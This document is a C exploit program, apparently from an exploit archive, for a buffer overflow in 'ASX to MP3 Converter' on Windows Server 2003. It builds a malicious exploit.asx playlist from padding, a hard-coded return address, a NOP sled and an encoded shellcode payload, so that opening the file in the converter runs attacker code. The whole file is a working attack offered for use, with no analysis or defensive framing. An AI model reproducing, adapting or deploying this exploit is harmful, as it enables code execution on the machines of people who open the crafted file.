/*
ASX to MP3 Converter SOF - Ivan Ivanovic Ivanov Иван-дурак
недействительный 31337 Team
holahola ~ https://www.exploit-db.com/exploits/38382/
Winblows 2k3
*/

#include <stdio.h>
#include <windows.h>
#include <malloc.h>

int main() {

    int i;
    char *overwrite_offset = malloc(255);
    for(i = 0; i < 255; i += 5) {
        char padding[] = "\x41\x41\x41\x41\x41";  
        memcpy(overwrite_offset + i, padding, strlen(padding));
    }
    memset(overwrite_offset + _msize(overwrite_offset) - 1, 0x00, 1);

    char retn[] = "\x9d\x78\x03\x10";   //  0x1003789d  
    char shellcode[] = 
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" // NOP sled
    "\xbb\xbb\x74\x47\x6e\xdb\xc5\xd9\x74\x24\xf4\x58\x2b\xc9\xb1"
    "\x52\x31\x58\x12\x03\x58\x12\x83\x53\x88\xa5\x9b\x5f\x99\xa8"
    "\x64\x9f\x5a\xcd\xed\x7a\x6b\xcd\x8a\x0f\xdc\xfd\xd9\x5d\xd1"
    "\x76\x8f\x75\x62\xfa\x18\x7a\xc3\xb1\x7e\xb5\xd4\xea\x43\xd4"
    "\x56\xf1\x97\x36\x66\x3a\xea\x37\xaf\x27\x07\x65\x78\x23\xba"
    "\x99\x0d\x79\x07\x12\x5d\x6f\x0f\xc7\x16\x8e\x3e\x56\x2c\xc9"
    "\xe0\x59\xe1\x61\xa9\x41\xe6\x4c\x63\xfa\xdc\x3b\x72\x2a\x2d"
    "\xc3\xd9\x13\x81\x36\x23\x54\x26\xa9\x56\xac\x54\x54\x61\x6b"
    "\x26\x82\xe4\x6f\x80\x41\x5e\x4b\x30\x85\x39\x18\x3e\x62\x4d"
    "\x46\x23\x75\x82\xfd\x5f\xfe\x25\xd1\xe9\x44\x02\xf5\xb2\x1f"
    "\x2b\xac\x1e\xf1\x54\xae\xc0\xae\xf0\xa5\xed\xbb\x88\xe4\x79"
    "\x0f\xa1\x16\x7a\x07\xb2\x65\x48\x88\x68\xe1\xe0\x41\xb7\xf6"
    "\x07\x78\x0f\x68\xf6\x83\x70\xa1\x3d\xd7\x20\xd9\x94\x58\xab"
    "\x19\x18\x8d\x7c\x49\xb6\x7e\x3d\x39\x76\x2f\xd5\x53\x79\x10"
    "\xc5\x5c\x53\x39\x6c\xa7\x34\x86\xd9\xd0\x37\x6e\x18\x1e\x9b"
    "\x47\x95\xf8\xb1\x87\xf3\x53\x2e\x31\x5e\x2f\xcf\xbe\x74\x4a"
    "\xcf\x35\x7b\xab\x9e\xbd\xf6\xbf\x77\x4e\x4d\x9d\xde\x51\x7b"
    "\x89\xbd\xc0\xe0\x49\xcb\xf8\xbe\x1e\x9c\xcf\xb6\xca\x30\x69"
    "\x61\xe8\xc8\xef\x4a\xa8\x16\xcc\x55\x31\xda\x68\x72\x21\x22"
    "\x70\x3e\x15\xfa\x27\xe8\xc3\xbc\x91\x5a\xbd\x16\x4d\x35\x29"
    "\xee\xbd\x86\x2f\xef\xeb\x70\xcf\x5e\x42\xc5\xf0\x6f\x02\xc1"
    "\x89\x8d\xb2\x2e\x40\x16\xd2\xcc\x40\x63\x7b\x49\x01\xce\xe6"
    "\x6a\xfc\x0d\x1f\xe9\xf4\xed\xe4\xf1\x7d\xeb\xa1\xb5\x6e\x81"
    "\xba\x53\x90\x36\xba\x71";

    int buffer_size = _msize(overwrite_offset) + strlen(retn) + strlen(shellcode);
    char *buffer = malloc(buffer_size);

    memcpy(buffer, overwrite_offset, _msize(overwrite_offset));
    memcpy(buffer + _msize(overwrite_offset), retn, strlen(retn));
    memcpy(buffer + _msize(overwrite_offset) + strlen(retn), shellcode, strlen(shellcode));
    memset(buffer + buffer_size - 1, 0x00, 1);

    FILE * fp;
    fp = fopen("exploit.asx","w");
    fprintf(fp, buffer); 
    fclose(fp);

    return 0;

}
            